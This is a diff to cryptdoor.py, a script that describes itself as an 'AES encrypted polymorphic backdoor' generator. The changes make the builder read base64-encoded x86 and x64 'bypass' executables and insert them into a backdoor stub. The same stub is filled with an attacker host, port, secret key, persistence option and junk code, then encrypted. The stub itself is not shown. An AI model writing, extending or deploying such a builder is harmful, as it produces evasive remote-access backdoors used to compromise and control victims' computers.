@@ -1,4 +1,5 @@
-#!/usr/bin/python
+#!/usr/bin/env python
+#
 # cryptdoor.py - AES encrypted polymorphic backdoor
 # by @d4rkcat github.com/d4rkcat
 #
@@ -76,9 +77,15 @@ if args.persistence:
 	print ' [*] Auto-persistence enabled.'
 else:
 	persistpart = ' '
+	
+with open('base64/86', 'rb') as exe86:
+	bypass86 = "bypass86exe = '%s'" % (exe86.read())
+
+with open('base64/64', 'rb') as exe64:
+	bypass64 = "bypass64exe = '%s'" % (exe64.read())
 
 with open('stubs/backdoor.py', 'rb') as finalbackdoor:
-	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk)
+	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86)
 
 f = open(backdoorName, 'w')
 cipherEnc = AES.new(key)
